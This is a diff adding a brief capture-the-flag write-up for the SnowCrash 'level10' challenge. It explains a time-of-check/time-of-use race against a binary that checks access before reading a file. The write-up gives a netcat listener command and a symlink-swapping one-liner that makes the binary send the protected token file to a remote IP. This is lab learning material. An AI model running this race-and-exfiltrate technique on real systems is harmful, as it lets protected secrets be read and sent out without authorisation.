@@ -1,0 +1,17 @@
+Here we have a yet another binary file
+
+The goal is to trick the binary into reading our token file
+
+To do so, we have to “abuse” symlinks
+
+We can see in the binary that it can in fact read access a file and output it way later. But it doesn’t work with our token because we don’t have the permissions for
+
+So the idea is to make it access a validate file on which we have permissions and then and only then link the token we need to read
+
+The program will read this and send it to the server link, which we have to make listen with : 
+
+nc -l 6969
+
+An exemple could be :
+
+level10@SnowCrash:~$ ln -snf /var/crash/aled.txt /var/crash/link ; ./level10 /var/crash/link 192.168.64.1 | ln -snf ~/token /var/crash/link
